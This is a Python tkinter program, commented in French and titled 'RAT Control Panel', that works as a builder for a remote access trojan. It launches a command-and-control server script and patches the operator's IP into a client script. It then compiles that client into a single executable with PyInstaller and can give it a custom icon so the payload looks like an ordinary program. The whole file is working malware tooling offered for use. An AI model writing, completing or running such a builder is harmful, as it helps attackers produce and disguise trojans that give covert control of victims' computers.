import tkinter as tk
from tkinter import filedialog, messagebox
import subprocess
import os
import threading
import time
import sys
from PIL import Image

class RATControlPanel:
    def __init__(self, root):
        self.root = root
        self.root.title("RAT Control Panel")
        self.root.geometry("600x400")
        
        # Variables
        self.icon_path = None
        self.converted_icon_path = None
        self.server_process = None
        
        # Interface
        # Champ pour l'adresse IP
        self.ip_label = tk.Label(root, text="Adresse IP du serveur:")
        self.ip_label.pack(pady=5)
        self.ip_entry = tk.Entry(root, width=30)
        self.ip_entry.insert(0, "192.168.1.100")
        self.ip_entry.pack(pady=5)
        
        # Bouton pour démarrer le serveur
        self.start_server_btn = tk.Button(root, text="Démarrer le serveur", command=self.start_server)
        self.start_server_btn.pack(pady=5)
        
        # Bouton pour importer une icône
        self.import_icon_btn = tk.Button(root, text="Importer une icône (.png)", command=self.import_icon)
        self.import_icon_btn.pack(pady=5)
        
        # Bouton pour compiler le client
        self.compile_btn = tk.Button(root, text="Compiler le client", command=self.compile_client)
        self.compile_btn.pack(pady=5)
        
        # Zone de logs
        self.log_text = tk.Text(root, height=10, width=60, state='disabled')
        self.log_text.pack(pady=10)
        
    def log(self, message):
        """Ajouter un message dans la zone de logs."""
        self.log_text.config(state='normal')
        self.log_text.insert(tk.END, f"{time.ctime()}: {message}\n")
        self.log_text.config(state='disabled')
        self.log_text.see(tk.END)
        
    def start_server(self):
        """Démarrer server.py dans un processus séparé."""
        if self.server_process is not None and self.server_process.poll() is None:
            messagebox.showwarning("Avertissement", "Le serveur est déjà en cours d'exécution.")
            return
        
        if not os.path.exists("server.py"):
            messagebox.showerror("Erreur", "server.py introuvable dans le dossier courant.")
            return
        
        self.log("Démarrage du serveur...")
        try:
            # Lancer server.py et capturer stdout/stderr
            self.server_process = subprocess.Popen(
                [sys.executable, "server.py"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                bufsize=1,
                universal_newlines=True
            )
            
            # Thread pour lire les sorties
            threading.Thread(target=self.read_server_output, daemon=True).start()
        except Exception as e:
            self.log(f"Erreur lors du démarrage du serveur : {e}")
            messagebox.showerror("Erreur", f"Impossible de démarrer le serveur : {e}")
        
    def read_server_output(self):
        """Lire les sorties du serveur et les afficher dans les logs."""
        while self.server_process is not None and self.server_process.poll() is None:
            try:
                line = self.server_process.stdout.readline().strip()
                if line:
                    self.log(line)
                error_line = self.server_process.stderr.readline().strip()
                if error_line:
                    self.log(f"Erreur : {error_line}")
            except Exception as e:
                self.log(f"Erreur de lecture des sorties : {e}")
                break
            time.sleep(0.1)
        
        if self.server_process is not None and self.server_process.poll() is not None:
            self.log(f"Serveur arrêté avec le code de retour {self.server_process.poll()}")
        
    def import_icon(self):
        """Importer un fichier .png et le convertir en .ico."""
        file_path = filedialog.askopenfilename(
            filetypes=[("PNG files", "*.png"), ("All files", "*.*")]
        )
        if file_path:
            try:
                # Convertir .png en .ico
                img = Image.open(file_path)
                # Redimensionner à 32x32 pour une icône standard
                img = img.resize((32, 32), Image.Resampling.LANCZOS)
                # Enregistrer comme .ico
                self.converted_icon_path = "temp_icon.ico"
                img.save(self.converted_icon_path, format="ICO")
                self.icon_path = file_path
                self.log(f"Icône importée et convertie : {file_path} -> {self.converted_icon_path}")
            except Exception as e:
                self.log(f"Erreur lors de la conversion de l'icône : {e}")
                messagebox.showerror("Erreur", f"Impossible de convertir l'image : {e}")
        else:
            self.log("Aucune icône sélectionnée.")
        
    def compile_client(self):
        """Modifier client.py avec l'IP et compiler avec PyInstaller."""
        ip = self.ip_entry.get().strip()
        if not ip:
            messagebox.showerror("Erreur", "Veuillez entrer une adresse IP valide.")
            return
        
        if not os.path.exists("client.py"):
            messagebox.showerror("Erreur", "client.py introuvable dans le dossier courant.")
            return
        
        self.log("Modification de client.py avec l'adresse IP...")
        try:
            # Lire client.py
            with open("client.py", "r", encoding="utf-8") as f:
                content = f.readlines()
            
            # Modifier SERVER_HOST
            for i, line in enumerate(content):
                if line.strip().startswith("SERVER_HOST ="):
                    content[i] = f'SERVER_HOST = "{ip}"\n'
                    break
            else:
                messagebox.showerror("Erreur", "Impossible de trouver SERVER_HOST dans client.py.")
                return
            
            # Écrire le fichier modifié
            with open("client.py", "w", encoding="utf-8") as f:
                f.writelines(content)
            
            self.log(f"client.py modifié avec SERVER_HOST = {ip}")
            
            # Compiler avec PyInstaller
            self.log("Compilation du client avec PyInstaller...")
            cmd = [sys.executable, "-m", "PyInstaller", "--onefile"]
            if self.converted_icon_path and os.path.exists(self.converted_icon_path):
                cmd.extend(["--icon", self.converted_icon_path])
            cmd.append("client.py")
            
            process = subprocess.run(
                cmd,
                capture_output=True,
                text=True
            )
            
            if process.returncode == 0:
                self.log("Compilation réussie. Exécutable généré dans dist/client.exe")
                messagebox.showinfo("Succès", "Client compilé avec succès dans dist/client.exe")
                # Nettoyer le fichier .ico temporaire
                if self.converted_icon_path and os.path.exists(self.converted_icon_path):
                    os.remove(self.converted_icon_path)
                    self.log(f"Fichier temporaire {self.converted_icon_path} supprimé")
                    self.converted_icon_path = None
            else:
                self.log(f"Erreur de compilation : {process.stderr}")
                messagebox.showerror("Erreur", f"Échec de la compilation : {process.stderr}")
                
        except Exception as e:
            self.log(f"Erreur lors de la compilation : {e}")
            messagebox.showerror("Erreur", f"Erreur : {e}")

if __name__ == "__main__":
    root = tk.Tk()
    app = RATControlPanel(root)
    root.mainloop()